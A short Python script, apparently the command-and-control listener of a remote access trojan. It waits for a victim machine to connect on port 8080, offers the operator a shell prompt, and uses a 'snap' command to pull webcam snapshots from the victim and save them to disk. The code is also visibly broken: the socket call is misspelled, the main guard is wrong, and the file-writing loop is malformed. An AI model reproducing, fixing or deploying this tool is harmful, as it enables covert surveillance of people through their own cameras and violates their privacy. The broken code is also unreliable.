import socket


def receive_webcam_snapshot(conn):
    with open('/home/HL/Desktop/webcam.jpg','wb')as f:
        while True:
            bits = conn.recv(1024)
            if bits.endswith(b'DONE'):
                f.write(bits[:-4])
                f.close()
            print('[+]Webcam snapshot received and saved on the server desktop')
            break
    f.write(bits)

def connecting():
    s = socket.scket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('192.168.1.14',8080))
    s.listen(1)
    print('[+]Listening for incoming TCP connection on port 8080:')
    conn,addr = s.accept()
    print('[+]We got a connection from:',addr)

    while True:
        command = input("[@Shell]==>")
        if not command:
            continue

        if 'terminate' in command:
            conn.send('terminate'.encode())
            break
        
        elif 'snap' in command:
            conn.send('snap'.encode())
            receive_webcam_snapshot(conn)

def main():
    connecting()

if __name__ == '_main_':
    main()